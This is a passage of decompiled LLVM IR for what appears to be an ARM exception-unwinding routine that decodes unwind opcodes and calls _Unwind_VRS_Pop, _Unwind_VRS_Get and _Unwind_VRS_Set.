  %v1_18bfc = load i32, i32* @r5, align 4
  %v2_18bfc = inttoptr i32 %v1_18bfc to i32*
  store i32 %v0_18bfc, i32* %v2_18bfc, align 4
  br label %dec_label_pc_18c00

dec_label_pc_18c00:                               ; preds = %.thread30, %dec_label_pc_18be0
  %v0_18c00 = load i32, i32* %r0.global-to-local, align 4
  %v3_18c00 = udiv i32 %v0_18c00, 16777216
  %v1_18c04 = urem i32 %v3_18c00, 16
  %v3_18c08 = mul i32 %v0_18c00, 256
  store i32 %v3_18c08, i32* %r0.global-to-local, align 4
  %v1_18c0c = add nuw nsw i32 %v1_18c04, 1
  store i32 %v1_18c0c, i32* %r2.global-to-local, align 4
  %v1_18c10 = and i32 %v3_18c00, 240
  store i32 %v1_18c10, i32* %r3.global-to-local, align 4
  %v1_18c14 = load i32, i32* @r5, align 4
  %v2_18c14 = inttoptr i32 %v1_18c14 to i32*
  store i32 %v3_18c08, i32* %v2_18c14, align 4
  %v0_18c18 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c18 = load i32, i32* %r3.global-to-local, align 4
  %v4_18c18 = mul i32 %v1_18c18, 4096
  %v5_18c18 = or i32 %v4_18c18, %v0_18c18
  br label %dec_label_pc_18c1c

dec_label_pc_18c1c:                               ; preds = %dec_label_pc_18bcc, %dec_label_pc_18c00
  %storemerge132 = phi i32 [ %v5_18c18, %dec_label_pc_18c00 ], [ 720897, %dec_label_pc_18bcc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18c24:                               ; preds = %dec_label_pc_18bb0
  %v1_18c24 = and i32 %v0_18894, 252
  store i32 %v1_18c24, i32* %r3.global-to-local, align 4
  %v7_18c28 = icmp eq i32 %v1_18c24, 180
  store i1 %v7_18c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c28, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18c24
  %v2_18c2c = urem i32 %v0_18894, 4
  %v2_18c34 = add nuw nsw i32 %v2_18c2c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_18c40 = or i32 %v2_18c34, 262144
  store i32 %v2_18c40, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18b3c

bb157:                                            ; preds = %dec_label_pc_18c24
  %v2_18c30 = urem i32 %v0_18ba0, 8
  %v2_18c38 = add nuw nsw i32 %v2_18c30, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18c48 = or i32 %v2_18c38, 524288
  store i32 %v2_18c48, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18c50:                               ; preds = %dec_label_pc_18b60
  %v0_18c50 = load i32, i32* %ip.global-to-local, align 4
  %v7_18c50 = icmp eq i32 %v0_18c50, 198
  store i1 %v7_18c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c50, label %dec_label_pc_18c58, label %dec_label_pc_18a5c

dec_label_pc_18c58:                               ; preds = %dec_label_pc_18c50
  %v0_18c58 = load i32, i32* @r5, align 4
  %v1_18c58 = add i32 %v0_18c58, 8
  %v2_18c58 = inttoptr i32 %v1_18c58 to i8*
  %v3_18c58 = load i8, i8* %v2_18c58, align 1
  %v4_18c58 = zext i8 %v3_18c58 to i32
  store i32 %v4_18c58, i32* %r3.global-to-local, align 4
  %v2_18c5c = icmp eq i8 %v3_18c58, 0
  store i1 %v2_18c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c5c, label %dec_label_pc_18c6c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18c58
  %v2_18c60 = add nsw i32 %v4_18c58, -1
  store i32 %v2_18c60, i32* %r3.global-to-local, align 4
  %v2_18c64 = trunc i32 %v2_18c60 to i8
  store i8 %v2_18c64, i8* %v2_18c58, align 1
  %v0_18c68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c68.pr.pr, label %.thread48.dec_label_pc_18c6c_crit_edge, label %dec_label_pc_18ca0

.thread48.dec_label_pc_18c6c_crit_edge:           ; preds = %.thread48
  %v0_18c6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18c6c

dec_label_pc_18c6c:                               ; preds = %.thread48.dec_label_pc_18c6c_crit_edge, %dec_label_pc_18c58
  %v2_18c84 = phi i32 [ %v0_18c6c.pre, %.thread48.dec_label_pc_18c6c_crit_edge ], [ %v0_18c58, %dec_label_pc_18c58 ]
  %v1_18c6c = add i32 %v2_18c84, 9
  %v2_18c6c = inttoptr i32 %v1_18c6c to i8*
  %v3_18c6c = load i8, i8* %v2_18c6c, align 1
  %v4_18c6c = zext i8 %v3_18c6c to i32
  store i32 %v4_18c6c, i32* %r3.global-to-local, align 4
  %v2_18c70 = icmp eq i8 %v3_18c6c, 0
  store i1 %v2_18c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c70, label %dec_label_pc_18cbc, label %dec_label_pc_18c80

dec_label_pc_18c80:                               ; preds = %dec_label_pc_18c6c
  %v1_18c80 = add nsw i32 %v4_18c6c, -1
  store i32 %v1_18c80, i32* %r3.global-to-local, align 4
  %v1_18c84 = trunc i32 %v1_18c80 to i8
  store i8 %v1_18c84, i8* %v2_18c6c, align 1
  %v0_18c88 = load i32, i32* @r5, align 4
  %v1_18c88 = add i32 %v0_18c88, 4
  %v2_18c88 = inttoptr i32 %v1_18c88 to i32*
  %v3_18c88 = load i32, i32* %v2_18c88, align 4
  store i32 %v3_18c88, i32* %r2.global-to-local, align 4
  %v1_18c8c = inttoptr i32 %v3_18c88 to i32*
  %v2_18c8c = load i32, i32* %v1_18c8c, align 4
  store i32 %v2_18c8c, i32* %r0.global-to-local, align 4
  %v4_18c8c = add i32 %v3_18c88, 4
  store i32 %v4_18c8c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18c8c, i32* %v2_18c88, align 4
  %v0_18c98 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c98 = trunc i32 %v0_18c98 to i8
  %v2_18c98 = load i32, i32* @r5, align 4
  %v3_18c98 = add i32 %v2_18c98, 8
  %v4_18c98 = inttoptr i32 %v3_18c98 to i8*
  store i8 %v1_18c98, i8* %v4_18c98, align 1
  %v0_18c9c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c9c = load i32, i32* @r5, align 4
  %v2_18c9c = inttoptr i32 %v1_18c9c to i32*
  store i32 %v0_18c9c, i32* %v2_18c9c, align 4
  br label %dec_label_pc_18ca0

dec_label_pc_18ca0:                               ; preds = %.thread48, %dec_label_pc_18c80
  %v0_18ca0 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ca0 = udiv i32 %v0_18ca0, 16777216
  %v1_18ca4 = urem i32 %v3_18ca0, 16
  %v3_18ca8 = mul i32 %v0_18ca0, 256
  store i32 %v3_18ca8, i32* %r0.global-to-local, align 4
  %v1_18cac = add nuw nsw i32 %v1_18ca4, 1
  store i32 %v1_18cac, i32* %r2.global-to-local, align 4
  %v1_18cb0 = and i32 %v3_18ca0, 240
  store i32 %v1_18cb0, i32* %r3.global-to-local, align 4
  %v1_18cb4 = load i32, i32* @r5, align 4
  %v2_18cb4 = inttoptr i32 %v1_18cb4 to i32*
  store i32 %v3_18ca8, i32* %v2_18cb4, align 4
  %v0_18cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18cb8 = load i32, i32* %r3.global-to-local, align 4
  %v4_18cb8 = mul i32 %v1_18cb8, 4096
  %v5_18cb8 = or i32 %v4_18cb8, %v0_18cb8
  br label %dec_label_pc_18cbc

dec_label_pc_18cbc:                               ; preds = %dec_label_pc_18c6c, %dec_label_pc_18ca0
  %storemerge131 = phi i32 [ %v5_18cb8, %dec_label_pc_18ca0 ], [ 720897, %dec_label_pc_18c6c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18cc4:                               ; preds = %dec_label_pc_18a80
  %v0_18cc4 = load i32, i32* @r5, align 4
  %v1_18cc4 = add i32 %v0_18cc4, 8
  %v2_18cc4 = inttoptr i32 %v1_18cc4 to i8*
  %v3_18cc4 = load i8, i8* %v2_18cc4, align 1
  %v4_18cc4 = zext i8 %v3_18cc4 to i32
  store i32 %v4_18cc4, i32* %r3.global-to-local, align 4
  %v2_18cc8 = icmp eq i8 %v3_18cc4, 0
  store i1 %v2_18cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cc8, label %dec_label_pc_18cd8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18cc4
  %v2_18ccc = add nsw i32 %v4_18cc4, -1
  store i32 %v2_18ccc, i32* %r3.global-to-local, align 4
  %v2_18cd0 = trunc i32 %v2_18ccc to i8
  store i8 %v2_18cd0, i8* %v2_18cc4, align 1
  %v0_18cd4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18cd4.pr.pr, label %.thread52.dec_label_pc_18cd8_crit_edge, label %dec_label_pc_18d0c

.thread52.dec_label_pc_18cd8_crit_edge:           ; preds = %.thread52
  %v0_18cd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %.thread52.dec_label_pc_18cd8_crit_edge, %dec_label_pc_18cc4
  %v2_18cf0 = phi i32 [ %v0_18cd8.pre, %.thread52.dec_label_pc_18cd8_crit_edge ], [ %v0_18cc4, %dec_label_pc_18cc4 ]
  %v1_18cd8 = add i32 %v2_18cf0, 9
  %v2_18cd8 = inttoptr i32 %v1_18cd8 to i8*
  %v3_18cd8 = load i8, i8* %v2_18cd8, align 1
  %v4_18cd8 = zext i8 %v3_18cd8 to i32
  store i32 %v4_18cd8, i32* %r3.global-to-local, align 4
  %v2_18cdc = icmp eq i8 %v3_18cd8, 0
  store i1 %v2_18cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cdc, label %dec_label_pc_18d28, label %dec_label_pc_18cec

dec_label_pc_18cec:                               ; preds = %dec_label_pc_18cd8
  %v1_18cec = add nsw i32 %v4_18cd8, -1
  store i32 %v1_18cec, i32* %r3.global-to-local, align 4
  %v1_18cf0 = trunc i32 %v1_18cec to i8
  store i8 %v1_18cf0, i8* %v2_18cd8, align 1
  %v0_18cf4 = load i32, i32* @r5, align 4
  %v1_18cf4 = add i32 %v0_18cf4, 4
  %v2_18cf4 = inttoptr i32 %v1_18cf4 to i32*
  %v3_18cf4 = load i32, i32* %v2_18cf4, align 4
  store i32 %v3_18cf4, i32* %r2.global-to-local, align 4
  %v1_18cf8 = inttoptr i32 %v3_18cf4 to i32*
  %v2_18cf8 = load i32, i32* %v1_18cf8, align 4
  store i32 %v2_18cf8, i32* %r0.global-to-local, align 4
  %v4_18cf8 = add i32 %v3_18cf4, 4
  store i32 %v4_18cf8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18cf8, i32* %v2_18cf4, align 4
  %v0_18d04 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d04 = trunc i32 %v0_18d04 to i8
  %v2_18d04 = load i32, i32* @r5, align 4
  %v3_18d04 = add i32 %v2_18d04, 8
  %v4_18d04 = inttoptr i32 %v3_18d04 to i8*
  store i8 %v1_18d04, i8* %v4_18d04, align 1
  %v0_18d08 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d08 = load i32, i32* @r5, align 4
  %v2_18d08 = inttoptr i32 %v1_18d08 to i32*
  store i32 %v0_18d08, i32* %v2_18d08, align 4
  br label %dec_label_pc_18d0c

dec_label_pc_18d0c:                               ; preds = %.thread52, %dec_label_pc_18cec
  %v0_18d0c = load i32, i32* %r0.global-to-local, align 4
  %v3_18d0c = udiv i32 %v0_18d0c, 16777216
  %v1_18d10 = urem i32 %v3_18d0c, 16
  %v3_18d14 = mul i32 %v0_18d0c, 256
  store i32 %v3_18d14, i32* %r0.global-to-local, align 4
  %v1_18d18 = add nuw nsw i32 %v1_18d10, 1
  store i32 %v1_18d18, i32* %r2.global-to-local, align 4
  %v1_18d1c = and i32 %v3_18d0c, 240
  store i32 %v1_18d1c, i32* %r3.global-to-local, align 4
  %v1_18d20 = load i32, i32* @r5, align 4
  %v2_18d20 = inttoptr i32 %v1_18d20 to i32*
  store i32 %v3_18d14, i32* %v2_18d20, align 4
  %v0_18d24 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d24 = load i32, i32* %r3.global-to-local, align 4
  %v4_18d24 = mul i32 %v1_18d24, 4096
  %v5_18d24 = or i32 %v4_18d24, %v0_18d24
  br label %dec_label_pc_18d28

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18cd8, %dec_label_pc_18d0c
  %storemerge130 = phi i32 [ %v5_18d24, %dec_label_pc_18d0c ], [ 720897, %dec_label_pc_18cd8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b3c

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18a5c
  %v0_18d30 = load i32, i32* @r5, align 4
  %v1_18d30 = add i32 %v0_18d30, 8
  %v2_18d30 = inttoptr i32 %v1_18d30 to i8*
  %v3_18d30 = load i8, i8* %v2_18d30, align 1
  %v4_18d30 = zext i8 %v3_18d30 to i32
  store i32 %v4_18d30, i32* %r3.global-to-local, align 4
  %v2_18d34 = icmp eq i8 %v3_18d30, 0
  store i1 %v2_18d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d34, label %dec_label_pc_18edc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18d30
  %v2_18d38 = add nsw i32 %v4_18d30, -1
  store i32 %v2_18d38, i32* %r3.global-to-local, align 4
  %v2_18d3c = trunc i32 %v2_18d38 to i8
  store i8 %v2_18d3c, i8* %v2_18d30, align 1
  %v0_18d40.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d40.pr.pr, label %.thread56.dec_label_pc_18edc_crit_edge, label %dec_label_pc_18d44

.thread56.dec_label_pc_18edc_crit_edge:           ; preds = %.thread56
  %v0_18edc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18edc

dec_label_pc_18d44:                               ; preds = %.thread56, %dec_label_pc_18ee8
  %v0_18d44 = load i32, i32* %r0.global-to-local, align 4
  %v3_18d44 = udiv i32 %v0_18d44, 16777216
  store i32 %v3_18d44, i32* %r3.global-to-local, align 4
  store i32 %v3_18d44, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18d44, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18d4c = mul i32 %v0_18d44, 256
  store i32 %v3_18d4c, i32* %r0.global-to-local, align 4
  %v1_18d50 = load i32, i32* @r5, align 4
  %v2_18d50 = inttoptr i32 %v1_18d50 to i32*
  store i32 %v3_18d4c, i32* %v2_18d50, align 4
  br i1 %tmp184, label %dec_label_pc_18b0c, label %dec_label_pc_18d58

dec_label_pc_18d58:                               ; preds = %dec_label_pc_18d44
  %v0_18d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d58 = and i32 %v0_18d58, 240
  store i32 %v1_18d58, i32* %r3.global-to-local, align 4
  %v2_18d58 = icmp eq i32 %v1_18d58, 0
  store i1 %v2_18d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d58, label %dec_label_pc_18d60, label %dec_label_pc_18b0c

dec_label_pc_18d60:                               ; preds = %dec_label_pc_18d58
  %v0_18d60 = load i32, i32* @r7, align 4
  store i32 %v0_18d60, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_18d68 = load i32, i32* %r2.global-to-local, align 4
  %v4_18d68 = call i32 @_Unwind_VRS_Pop(i32 %v0_18d60, i32 4, i32 %v2_18d68, i32 0)
  store i32 %v4_18d68, i32* %r0.global-to-local, align 4
  %v2_18d6c = icmp eq i32 %v4_18d68, 0
  store i1 %v2_18d6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d6c, label %dec_label_pc_1883c.backedge, label %dec_label_pc_18d74

dec_label_pc_18d74:                               ; preds = %dec_label_pc_18d60
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18964

dec_label_pc_18d7c:                               ; preds = %dec_label_pc_18ba8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18d88 = load i32, i32* @r7, align 4
  store i32 %v0_18d88, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_18d94 = call i32 @_Unwind_VRS_Get(i32 %v0_18d88, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18d94, i32* %r0.global-to-local, align 4
  %v0_18d98 = load i32, i32* @r5, align 4
  %v1_18d98 = add i32 %v0_18d98, 8
  %v2_18d98 = inttoptr i32 %v1_18d98 to i8*
  %v3_18d98 = load i8, i8* %v2_18d98, align 1
  %v4_18d98 = zext i8 %v3_18d98 to i32
  store i32 %v4_18d98, i32* %r1.global-to-local, align 4
  %v2_18d9c = icmp eq i8 %v3_18d98, 0
  store i1 %v2_18d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d9c, label %dec_label_pc_18dac, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_18d7c
  %v2_18da0 = add nsw i32 %v4_18d98, -1
  store i32 %v2_18da0, i32* %r3.global-to-local, align 4
  %v2_18da4 = trunc i32 %v2_18da0 to i8
  store i8 %v2_18da4, i8* %v2_18d98, align 1
  %v0_18da8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18da8.pr.pr, label %.thread58.dec_label_pc_18dac_crit_edge, label %dec_label_pc_18dd8

.thread58.dec_label_pc_18dac_crit_edge:           ; preds = %.thread58
  %v0_18dac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %.thread58.dec_label_pc_18dac_crit_edge, %dec_label_pc_18d7c
  %v2_18dc0 = phi i32 [ %v0_18dac.pre, %.thread58.dec_label_pc_18dac_crit_edge ], [ %v0_18d98, %dec_label_pc_18d7c ]
  %v1_18dac = add i32 %v2_18dc0, 9
  %v2_18dac = inttoptr i32 %v1_18dac to i8*
  %v3_18dac = load i8, i8* %v2_18dac, align 1
  %v4_18dac = zext i8 %v3_18dac to i32
  store i32 %v4_18dac, i32* %r3.global-to-local, align 4
  %v2_18db0 = icmp eq i8 %v3_18dac, 0
  store i1 %v2_18db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18db0, label %bb158, label %dec_label_pc_18dbc

bb158:                                            ; preds = %dec_label_pc_18dac
  %v1_18db4 = load i32, i32* @r6, align 4
  store i32 %v1_18db4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18e00

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18dac
  %v1_18dbc = add nsw i32 %v4_18dac, -1
  store i32 %v1_18dbc, i32* %r3.global-to-local, align 4
  %v1_18dc0 = trunc i32 %v1_18dbc to i8
  store i8 %v1_18dc0, i8* %v2_18dac, align 1
  %v0_18dc4 = load i32, i32* @r5, align 4
  %v1_18dc4 = add i32 %v0_18dc4, 4
  %v2_18dc4 = inttoptr i32 %v1_18dc4 to i32*
  %v3_18dc4 = load i32, i32* %v2_18dc4, align 4
  store i32 %v3_18dc4, i32* %r2.global-to-local, align 4
  %v1_18dc8 = inttoptr i32 %v3_18dc4 to i32*
  %v2_18dc8 = load i32, i32* %v1_18dc8, align 4
  store i32 %v2_18dc8, i32* %r0.global-to-local, align 4
  %v4_18dc8 = add i32 %v3_18dc4, 4
  store i32 %v4_18dc8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18dd0 = inttoptr i32 %v0_18dc4 to i32*
  store i32 %v2_18dc8, i32* %v1_18dd0, align 4
  %v5_18dd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18dd0, i32* %v2_18dc4, align 4
  %v0_18dd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18dd4 = trunc i32 %v0_18dd4 to i8
  %v2_18dd4 = load i32, i32* @r5, align 4
  %v3_18dd4 = add i32 %v2_18dd4, 8
  %v4_18dd4 = inttoptr i32 %v3_18dd4 to i8*
  store i8 %v1_18dd4, i8* %v4_18dd4, align 1
  br label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %.thread58, %dec_label_pc_18dbc
  %v0_18dd8 = load i32, i32* @r5, align 4
  %v1_18dd8 = inttoptr i32 %v0_18dd8 to i32*
  %v2_18dd8 = load i32, i32* %v1_18dd8, align 4
  store i32 %v2_18dd8, i32* %r3.global-to-local, align 4
  %v3_18ddc = mul i32 %v2_18dd8, 256
  store i32 %v3_18ddc, i32* %r0.global-to-local, align 4
  %v3_18de0 = udiv i32 %v2_18dd8, 16777216
  store i32 %v3_18de0, i32* %r2.global-to-local, align 4
  store i32 %v3_18ddc, i32* %v1_18dd8, align 4
  %v0_18de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18de8 = and i32 %v0_18de8, 128
  %v2_18de8 = icmp eq i32 %v1_18de8, 0
  store i1 %v2_18de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18de8, label %.thread129, label %dec_label_pc_18dfc

.thread129:                                       ; preds = %dec_label_pc_18dd8
  %v4_18dec = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_18dec, i32* %ip.global-to-local, align 4
  %v1_18df0 = urem i32 %v0_18de8, 256
  store i32 %v1_18df0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_18e70

dec_label_pc_18dfc:                               ; preds = %dec_label_pc_18dd8
  %v1_18df063 = urem i32 %v0_18de8, 256
  store i32 %v1_18df063, i32* %r2.global-to-local, align 4
  %v0_18dfc = load i32, i32* @r5, align 4
  %v1_18dfc = add i32 %v0_18dfc, 8
  %v2_18dfc = inttoptr i32 %v1_18dfc to i8*
  %v3_18dfc = load i8, i8* %v2_18dfc, align 1
  %v4_18dfc = zext i8 %v3_18dfc to i32
  store i32 %v4_18dfc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e00

dec_label_pc_18e00:                               ; preds = %bb158, %dec_label_pc_18dfc
  %v3_18e2099 = phi i32 [ %v2_18dc0, %bb158 ], [ %v0_18dfc, %dec_label_pc_18dfc ]
  %v0_18e0892 = phi i32 [ %v1_18db4, %bb158 ], [ %v1_18df063, %dec_label_pc_18dfc ]
  %v3_18e00 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_18e00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18e08.backedge, %dec_label_pc_18e00
  %v3_18e20 = phi i32 [ %v3_18e20100, %dec_label_pc_18e08.backedge ], [ %v3_18e2099, %dec_label_pc_18e00 ]
  %v0_18e1c = phi i32 [ %v2_18e0c.pre, %dec_label_pc_18e08.backedge ], [ 2, %dec_label_pc_18e00 ]
  %v0_18e0c = phi i32 [ %v0_18e0c.pre, %dec_label_pc_18e08.backedge ], [ %v3_18e00, %dec_label_pc_18e00 ]
  %v0_18e08 = phi i32 [ %v0_18e0895, %dec_label_pc_18e08.backedge ], [ %v0_18e0892, %dec_label_pc_18e00 ]
  %v1_18e08 = urem i32 %v0_18e08, 128
  %v7_18e0c = shl i32 %v1_18e08, %v0_18e1c
  %v8_18e0c = add i32 %v7_18e0c, %v0_18e0c
  store i32 %v8_18e0c, i32* %ip.global-to-local, align 4
  %v0_18e10 = load i32, i32* %r1.global-to-local, align 4
  %v2_18e10 = icmp eq i32 %v0_18e10, 0
  store i1 %v2_18e10, i1* %cpsr_z.global-to-local, align 1
  %v1_18e14 = add i32 %v0_18e10, -1
  store i32 %v1_18e14, i32* %r3.global-to-local, align 4
  store i32 %v8_18e0c, i32* %stack_var_-36, align 4
  %v1_18e1c = add i32 %v0_18e1c, 7
  store i32 %v1_18e1c, i32* @lr, align 4
  br i1 %v2_18e10, label %dec_label_pc_18e28, label %bb159

bb159:                                            ; preds = %dec_label_pc_18e08
  %v2_18e20 = trunc i32 %v1_18e14 to i8
  %v4_18e20 = add i32 %v3_18e20, 8
  %v5_18e20 = inttoptr i32 %v4_18e20 to i8*
  store i8 %v2_18e20, i8* %v5_18e20, align 1
  %v0_18e24.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e24.pr, label %.dec_label_pc_18e28_crit_edge, label %dec_label_pc_18e54

.dec_label_pc_18e28_crit_edge:                    ; preds = %bb159
  %v0_18e28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e28

dec_label_pc_18e28:                               ; preds = %.dec_label_pc_18e28_crit_edge, %dec_label_pc_18e08
  %v2_18e40 = phi i32 [ %v0_18e28.pre, %.dec_label_pc_18e28_crit_edge ], [ %v3_18e20, %dec_label_pc_18e08 ]
  %v1_18e28 = add i32 %v2_18e40, 9
  %v2_18e28 = inttoptr i32 %v1_18e28 to i8*
  %v3_18e28 = load i8, i8* %v2_18e28, align 1
  %v4_18e28 = zext i8 %v3_18e28 to i32
  store i32 %v4_18e28, i32* %r3.global-to-local, align 4
  %v2_18e2c = icmp eq i8 %v3_18e28, 0
  store i1 %v2_18e2c, i1* %cpsr_z.global-to-local, align 1
  %v1_18e30 = add nsw i32 %v4_18e28, -1
  store i32 %v1_18e30, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_18e2c, label %dec_label_pc_18e08.backedge, label %dec_label_pc_18e3c

dec_label_pc_18e3c:                               ; preds = %dec_label_pc_18e28
  %v1_18e3c = add i32 %v2_18e40, 4
  %v2_18e3c = inttoptr i32 %v1_18e3c to i32*
  %v3_18e3c = load i32, i32* %v2_18e3c, align 4
  store i32 %v3_18e3c, i32* %r2.global-to-local, align 4
  %v1_18e40 = trunc i32 %v1_18e30 to i8
  store i8 %v1_18e40, i8* %v2_18e28, align 1
  %v0_18e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e44 = inttoptr i32 %v0_18e44 to i32*
  %v2_18e44 = load i32, i32* %v1_18e44, align 4
  store i32 %v2_18e44, i32* %r0.global-to-local, align 4
  %v4_18e44 = add i32 %v0_18e44, 4
  store i32 %v4_18e44, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_18e4c = load i32, i32* @r5, align 4
  %v3_18e4c = add i32 %v2_18e4c, 8
  %v4_18e4c = inttoptr i32 %v3_18e4c to i8*
  store i8 3, i8* %v4_18e4c, align 1
  %v0_18e50 = load i32, i32* @r5, align 4
  %v1_18e50 = inttoptr i32 %v0_18e50 to i32*
  %v2_18e50 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_18e50, i32* %v1_18e50, align 4
  %v3_18e50 = add i32 %v0_18e50, 4
  %v4_18e50 = inttoptr i32 %v3_18e50 to i32*
  %v5_18e50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18e50, i32* %v4_18e50, align 4
  br label %dec_label_pc_18e54

dec_label_pc_18e54:                               ; preds = %bb159, %dec_label_pc_18e3c
  %v0_18e54 = load i32, i32* @r5, align 4
  %v1_18e54 = inttoptr i32 %v0_18e54 to i32*
  %v2_18e54 = load i32, i32* %v1_18e54, align 4
  store i32 %v2_18e54, i32* %r3.global-to-local, align 4
  %v3_18e58 = udiv i32 %v2_18e54, 16777216
  store i32 %v3_18e58, i32* %r2.global-to-local, align 4
  %v1_18e5c = and i32 %v3_18e58, 128
  %v2_18e5c = icmp eq i32 %v1_18e5c, 0
  store i1 %v2_18e5c, i1* %cpsr_z.global-to-local, align 1
  %v3_18e60 = mul i32 %v2_18e54, 256
  store i32 %v3_18e60, i32* %r0.global-to-local, align 4
  store i32 %v3_18e60, i32* %v1_18e54, align 4
  %v0_18e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18e68 = urem i32 %v0_18e68, 256
  store i32 %v1_18e68, i32* %r2.global-to-local, align 4
  br i1 %v2_18e5c, label %dec_label_pc_18e70.loopexit, label %dec_label_pc_18e9c

dec_label_pc_18e70.loopexit:                      ; preds = %dec_label_pc_18e54
  %v0_18e74.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_18e78.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18e70

dec_label_pc_18e70:                               ; preds = %dec_label_pc_18e70.loopexit, %.thread129
  %v2_18e78 = phi i32 [ 2, %.thread129 ], [ %v2_18e78.pre, %dec_label_pc_18e70.loopexit ]
  %v0_18e74 = phi i32 [ %v4_18dec, %.thread129 ], [ %v0_18e74.pre, %dec_label_pc_18e70.loopexit ]
  %v0_18e70 = phi i32 [ %v1_18df0, %.thread129 ], [ %v1_18e68, %dec_label_pc_18e70.loopexit ]
  %v1_18e70 = urem i32 %v0_18e70, 128
  %v1_18e74 = add i32 %v0_18e74, 516
  %v7_18e78 = shl i32 %v1_18e70, %v2_18e78
  %v8_18e78 = add i32 %v1_18e74, %v7_18e78
  store i32 %v8_18e78, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18e80 = load i32, i32* @r7, align 4
  store i32 %v0_18e80, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_18e78, i32* %stack_var_-36, align 4
  %v5_18e94 = call i32 @_Unwind_VRS_Set(i32 %v0_18e80, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e94, i32* %r0.global-to-local, align 4
